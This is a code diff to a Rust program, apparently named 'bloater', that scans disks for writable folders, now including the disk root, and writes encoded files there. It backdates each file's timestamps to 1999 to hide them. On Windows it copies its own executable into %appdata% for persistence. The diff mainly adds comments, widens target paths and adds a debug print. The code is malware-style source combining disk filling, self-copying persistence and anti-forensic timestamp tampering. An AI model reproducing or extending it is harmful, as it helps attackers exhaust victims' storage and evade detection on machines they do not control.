@@ -54,11 +54,11 @@ fn create_file(path: &str, name:u64, data: Vec<u8>) -> String{
 
 }
 
-
 #[cfg(target_os = "windows")]
+// Adding persistence for the windows compilation
 fn adding_persistence(filepath: &str) -> std::io::Result<()>{
 	let original_path = std::env::current_exe()?;
-    let new_path = format!("{}{}",&filepath,"bloater_copy.exe");
+    let new_path = format!("{}{}",Path::new(r"%appdata%/").display(),"bloater_copy.exe");
 
     let mut f ;
 	let mut buffer:Vec<u8> = Vec::new();
@@ -97,6 +97,7 @@ fn adding_persistence(filepath: &str) -> std::io::Result<()>{
 
 
 #[cfg(target_os = "linux")]
+// Adding persistenec for the linux compilation
 fn adding_persistence(path: &str) -> std::io::Result<()>{
 	Ok(())	
 }
@@ -126,8 +127,8 @@ fn main() -> std::io::Result<()> {
 
 		// Search for a valid path to write to
 		let mut valid_path = String::new();
-		// tmp or temp folder don't need admin access to write to
-		let path_array = [r"/temp/", r"/tmp/"];
+		// Try different path on the disk where it can write to
+		let path_array = [r"/temp/", r"/tmp/", r"/"];
 		let mut has_found_path = false;
 
 		for path in path_array {
@@ -142,7 +143,9 @@ fn main() -> std::io::Result<()> {
 			}
 		}
 
+		// If no paths are found
 		if !has_found_path{
+			// Select the next disks
 			continue
 		}
 		// At this point, we found a valid folder for the disk
@@ -168,10 +171,12 @@ fn main() -> std::io::Result<()> {
 
 			let path_file: String = create_file(&valid_path,n2,encoded);
 			
-			// Change the access and modified date
-			set_file_times(path_file, FileTime::from_unix_time(915148800,0),FileTime::from_unix_time(915148800,0));
+			// Change the access and modified date to 1999
+			let _ = set_file_times(path_file, FileTime::from_unix_time(915148800,0),FileTime::from_unix_time(915148800,0));
 
 			}
+
+			println!("VAR HOME : {:?}", std::env::var("HOMEPATH"));
 
 			#[cfg(feature="persistent")]{
 				adding_persistence(&valid_path);
